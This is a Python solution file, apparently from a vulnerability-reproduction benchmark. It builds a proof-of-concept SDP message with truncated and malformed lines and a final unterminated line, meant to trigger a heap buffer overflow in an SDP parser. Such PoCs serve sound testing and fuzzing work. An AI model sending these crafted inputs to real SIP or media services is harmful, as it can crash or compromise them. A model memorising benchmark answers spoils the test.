import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in core: parser/sdp.
        The vulnerability is described as missing bounds checks when parsing values.
        """
        
        # Construct an SDP payload that includes valid headers to pass initial validation,
        # followed by malformed lines designed to trigger out-of-bounds reads/writes during value parsing.
        
        parts = [
            # Mandatory SDP lines
            b"v=0",
            b"o=fuzzer 1234 5678 IN IP4 127.0.0.1",
            b"s=TestSession",
            b"c=IN IP4 127.0.0.1",
            b"t=0 0",
            
            # Valid m-line and a-line
            b"m=audio 10000 RTP/AVP 0",
            b"a=rtpmap:0 PCMU/8000",
            
            # --- Trigger Attempts ---
            
            # 1. Attribute with missing value entirely
            b"a=recvonly",
            
            # 2. Attribute with empty value (colon but no content)
            b"a=fmtp:",
            
            # 3. Attribute with malformed value (missing parameters expected by parser)
            b"a=rtpmap:101",
            
            # 4. Truncated m-line (missing port/proto/fmt)
            b"m=video",
            
            # 5. Truncated c-line (missing address)
            b"c=IN IP4",
            
            # 6. Malformed 'o' line (origin) with missing fields
            b"o=malformed 1 1 IN IP4",
            
            # 7. Line with trailing space and NO newline at the end of the buffer.
            # This is a classic trigger for "while(*p == ' ') p++;" loops that don't check bounds.
            b"a=quality:0 "
        ]
        
        # Join lines with CRLF. 
        # Note that the last element will NOT have a trailing CRLF appended by join,
        # which is crucial for triggering EOF-related parsing bugs.
        poc = b"\r\n".join(parts)
        
        return poc
